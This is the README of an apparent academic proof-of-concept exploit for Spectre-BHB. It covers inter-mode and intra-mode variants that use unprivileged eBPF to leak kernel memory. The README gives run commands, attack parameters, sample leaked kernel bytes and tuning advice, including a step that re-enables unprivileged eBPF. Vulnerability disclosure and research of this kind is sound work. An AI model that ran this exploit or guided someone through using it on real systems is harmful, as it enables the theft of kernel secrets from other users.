# Exploit inter-mode and intra-mode

## About

These are a full end-to-end exploit showing how Spectre-BHB can be abused to obtain an arbitrary read primitive to leak kernel memory.

#### What is the difference among inter-mode and intra-mode exploits?

These two exploits share a large portion of code but showcase two completely different threat models:

* [inter_mode](inter_mode) demonstrates how the unprivileged history can be used to mount spectre v2 attacks even in the presence of the ad-hoc hardware defense `eIBRS`.

* [intra_mode](intra_mode) shows same privilege mode exploitation (e.g. kernel to kernel) is not only possible but practical. This is to prove that  BTB-tagging defenses (such as `eIBRS` and `CSV2`) are not safe *by-design* in case of attacker-friendly tools such as unprivileged eBPF.

## How to run

The exploit is meant to be run on the host system and can be simply executed by issuing:

```
make TARGET=INTEL_10_GEN # or INTEL_11_GEN
./run.sh
```

In more details, `run.sh` will start with a setup phase by:

1. Ensuring that unprivileged-eBPF is enabled with `sysctl kernel.unprivileged_bpf_disabled=0`
2. Obtaining a kernel address where to start the leakage. For example, `run.sh` starts leaking from `do_syscall_64`. Any address can be used.
3. Locating the page offset where the `sys_call_table` is stored. This is needed to make the exploit reliable by evicting the `sys_call_table` to enlarge the speculative window. 

After this, the exploit is started by specifying the following parameters:

* `-a` : Start address where to leak in hexadecimal (e.g. `0xffffffffa29f3ac0`)
* `-f` : Eviction+Reload threshold. See run output to tune it (e.g. `40`)
* `-l` : Enable `sys_call_table` eviction to make the exploit reliable
* `-o` : `sys_call_table` page offset in hexadecimal (e.g. `0x300`)
* `-e` : Desired size of reduced `sys_call_table` eviction set. The lower the better but due to the noise it can be hard to obtain one (e.g. `256`)
* `-s` : `sys_call_table` eviction threshold See run output to tune it (e.g. 350)

## Expected output

```
[+] Parsed parameters: 
     -  leaking from                        0xffffffffa29f3ac0
     -  threshold E+R buffer eviction       40
    sys_call_table eviction parameters:
     -  sys_call_table page offset          0x300
     -  threshold sys_call_table eviction   350
     -  eviction set size sys_call_table    256
[+] Syscall time without eviction:          avg: 195.42  min:  170  max:  566
[+] Syscall time with large eviction set:   avg: 764.19  min:  398  max: 1966
[+] Syscall time with small eviction set:   avg: 449.23  min:  388  max: 1926
[+] Required time: 25 seconds
[+] Reload time without eviction:              avg: 11.77  min:   11  max:   13
[+] Reload time    with eviction:              avg: 172.90  min:   66  max:  511
[+] Checking if we can evict all entries: 
    - Entry 0: 0 hits (avg time 160.220001)
    - Entry 1: 0 hits (avg time 83.884003)
    OK!
[+] Required time: 1 seconds
hits: 8 1111111101010011110101111100010110101011101100011011001111010011001101111011011100000111010101001001111010111001001001100010101101010111100110010000111110010100001000111100111111001110111001000000011100111110010101011111100100100000010101110100101001111101
[+] Colliding history found after 5424 tries!
1111111101010011110101111100010110101011101100011011001111010011001101111011011100000111010101001001111010111001001001100010101101010111100110010000111110010100001000111100111111001110111001000000011100111110010101011111100100100000010101110100101001111101
[+] Required time: 4 seconds
0xffffffffa29f3ac0: 54 49 89 f8 08 89 e5 41     TI.....A
0xffffffffa29f3ac8: 44 49 89 84 0f 1f 04 00     DI......
0xffffffffa29f3ad0: 00 65 89 05 e8 5a 62 5c     .e...Zb\
0xffffffffa29f3ad8: 25 ff 03 00 00 48 83 c0     %....H..
0xffffffffa29f3ae0: 0f 25 f8 07 00 00 48 29     .%....H)
0xffffffffa29f3ae8: c4 48 8d 44 24 0f 48 83     .H.D$.H.
0xffffffffa29f3af0: e0 f0 4c 89 c6 4c 89 e7     ..L..L..
0xffffffffa29f3af8: 48 e3 3f 00 00 48 3d b4     H.?..H=.
0xffffffffa29f3b00: 00 00 00 77 2f 48 3d bf     ...w/H=.        72.000000 B/s
0xffffffffa29f3b08: 01 00 00 48 19 d2 48 21     ...H..H!        80.000000 B/s
0xffffffffa29f3b10: d0 4c 89 e7 48 8b 04 c5     .L..H...        88.000000 B/s
0xffffffffa29f3b18: 00 03 00 a3 e8 ff e0 40     .......@        96.000000 B/s
0xffffffffa29f3b20: 00 49 89 44 24 50 4c 88     .I.D$PL.        104.000000 B/s
0xffffffffa29f3b28: e7 e8 10 40 00 00 4c 88     ...@..L.        112.000000 B/s
0xffffffffa29f3b30: 65 f8 c9 c3 89 00 00 00     e.......        120.000000 B/s
0xffffffffa29f3b38: 40 70 eb 48 25 ff ff ff     @p.H%...        128.000000 B/s
0xffffffffa29f3b40: bf 48 3d 23 00 00 00 77     .H=#...w        136.000000 B/s
0xffffffffa29f3b48: dd 48 3d 24 02 00 00 48     .H=$...H        144.000000 B/s
0xffffffffa29f3b50: 19 d2 48 21 d0 44 89 e7     ..H!.D..        152.000000 B/s
0xffffffffa29f3b58: 40 8b 04 c5 00 22 00 a3     @...."..        160.000000 B/s
0xffffffffa29f3b60: e8 bb e8 40 00 49 89 44     ...@.I.D        168.000000 B/s
0xffffffffa29f3b68: 24 50 eb ba 0f 1f 40 00     $P....@.        176.000000 B/s
0xffffffffa29f3b70: 55 65 48 8b 04 25 c0 fb     UeH..%..        184.000000 B/s
0xffffffffa29f3b78: 01 00 48 89 e5 41 54 49     ..H..ATI        192.000000 B/s
0xffffffffa29f3b80: 89 fc 83 48 10 02 48 8b     ...H..H.        200.000000 B/s
0xffffffffa29f3b88: 77 78 07 1f 44 00 00 65     wx..D..e        208.000000 B/s
```

## Troubleshooting

#### [inter-mode only]  Ensure that the system is using `eIBRS` as `spectre_v2` defense and that no `spectre-bhb` mitigations are in place.
On our tested system, by issuing `/sys/devices/system/cpu/vulnerabilities/spectre_v2` we obtain `Mitigation: Enhanced IBRS, IBPB: conditional, RSB filling`.
#### Ensure that the Evict+Reload threshold is correctly selected

By running the exploit we can observe the reload time with and without eviction:

```
[+] Reload time without eviction:              avg: 11.77  min:   11  max:   13
[+] Reload time    with eviction:              avg: 172.90  min:   66  max:  511
```

Thus, a good threshold is `40`, and this can be specified using the argument `-f 40`.
We suggest to use the `avg` and `min` timings as reference to be on the safe side.

In case of a correctly selected threshold all entries will be evicted:

```
[+] Checking if we can evict all entries: 
    - Entry 0: 0 hits (avg time 160.220001)
    - Entry 1: 0 hits (avg time 83.884003)
    OK!
```
	
#### Ensure that the `sys_call_table` is correctly evicted

By running the exploit we can observe the reload time with and without eviction:

```
[+] Syscall time without eviction:          avg: 195.42  min:  170  max:  566
[+] Syscall time with large eviction set:   avg: 764.19  min:  398  max: 1966
```

Thus, a good threshold is `350`, and this can be specified using the argument `-s 350`
We suggest to use the `avg` and `min` timings as reference to be on the safe side.

In case of a correctly selected threshold, the eviction set will be reduced and the timing of the victim syscall will be still high:

```
[+] Syscall time with small eviction set:   avg: 449.23  min:  388  max: 1926
```

#### The `sys_call_table` eviction does not work.

The initial eviction set starts with an hardcoded size of 8192 congruent addresses. On same machines this may not be sufficient so it is necessary to increase this by changing the `SYS_CALL_TABLE_EV_SET_SIZE` constant.


#### I only leak 00 bytes

Very likely this means that the transient window is too small and thus that the `sys_call_table` eviction does not correctly work.

#### I cannot find a colliding history

This step may take a bit of time, especially on the 11th gen. Intel processors. We suggest to wait until ~300'000 tries are made.

#### Assertion `setrlimit(RLIMIT_MEMLOCK, &rlim)==0' failed.

Due to the raw Evict+Reload implementation, this PoC requires 24MB of eBPF maps. On some system this is beyond the allowed limit. To solve this issue ensure your user has the capability `CAP_SYS_RESOURCE`.




